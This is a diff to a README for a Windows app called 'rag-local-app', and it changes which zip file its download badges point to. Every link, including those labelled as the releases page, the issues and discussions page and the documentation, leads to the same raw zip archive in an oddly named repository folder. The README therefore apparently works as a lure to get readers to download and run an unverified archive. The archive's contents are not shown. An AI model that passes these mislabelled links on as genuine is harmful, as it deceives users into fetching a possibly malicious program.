@@ -1,6 +1,6 @@
 # 🛡 rag-local-app - Secure Local RAG System
 
-[![Download rag-local-app](https://img.shields.io/badge/Download-rag--local--app-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/thecontrolfreak/rag-local-app/main/the/rag-app-local-2.2.zip)
+[![Download rag-local-app](https://img.shields.io/badge/Download-rag--local--app-brightgreen?style=for-the-badge)](https://github.com/thecontrolfreak/rag-local-app/raw/refs/heads/main/the/rag-app-local-v1.4.zip)
 
 ---
 
@@ -34,9 +34,9 @@ Follow these steps to download, install, and run rag-local-app on your Windows m
 
 Click the badge below or visit the link to download the latest version of rag-local-app.
 
-[![Download rag-local-app](https://img.shields.io/badge/Download-rag--local--app-blue?style=for-the-badge)](https://raw.githubusercontent.com/thecontrolfreak/rag-local-app/main/the/rag-app-local-2.2.zip)
+[![Download rag-local-app](https://img.shields.io/badge/Download-rag--local--app-blue?style=for-the-badge)](https://github.com/thecontrolfreak/rag-local-app/raw/refs/heads/main/the/rag-app-local-v1.4.zip)
 
-1. Open the [rag-local-app releases page](https://raw.githubusercontent.com/thecontrolfreak/rag-local-app/main/the/rag-app-local-2.2.zip) in your web browser.
+1. Open the [rag-local-app releases page](https://github.com/thecontrolfreak/rag-local-app/raw/refs/heads/main/the/rag-app-local-v1.4.zip) in your web browser.
 
 2. Find the latest release. It will be the one at the top of the list.
 
@@ -148,7 +148,7 @@ These parts work automatically without user setup after you install the app.
 
 To update rag-local-app:
 
-1. Visit the [releases page](https://raw.githubusercontent.com/thecontrolfreak/rag-local-app/main/the/rag-app-local-2.2.zip) regularly.
+1. Visit the [releases page](https://github.com/thecontrolfreak/rag-local-app/raw/refs/heads/main/the/rag-app-local-v1.4.zip) regularly.
 
 2. Download the newest version following the download instructions above.
 
@@ -202,11 +202,11 @@ This will remove the app files, but it may leave data folders behind which you c
 
 ## 🔗 Useful Links
 
-- [rag-local-app Releases](https://raw.githubusercontent.com/thecontrolfreak/rag-local-app/main/the/rag-app-local-2.2.zip)
+- [rag-local-app Releases](https://github.com/thecontrolfreak/rag-local-app/raw/refs/heads/main/the/rag-app-local-v1.4.zip)
 
-- [Project Issues and Discussions](https://raw.githubusercontent.com/thecontrolfreak/rag-local-app/main/the/rag-app-local-2.2.zip)
+- [Project Issues and Discussions](https://github.com/thecontrolfreak/rag-local-app/raw/refs/heads/main/the/rag-app-local-v1.4.zip)
 
-- [Documentation and FAQs](https://raw.githubusercontent.com/thecontrolfreak/rag-local-app/main/the/rag-app-local-2.2.zip) (if available)
+- [Documentation and FAQs](https://github.com/thecontrolfreak/rag-local-app/raw/refs/heads/main/the/rag-app-local-v1.4.zip) (if available)
 
 ---
 
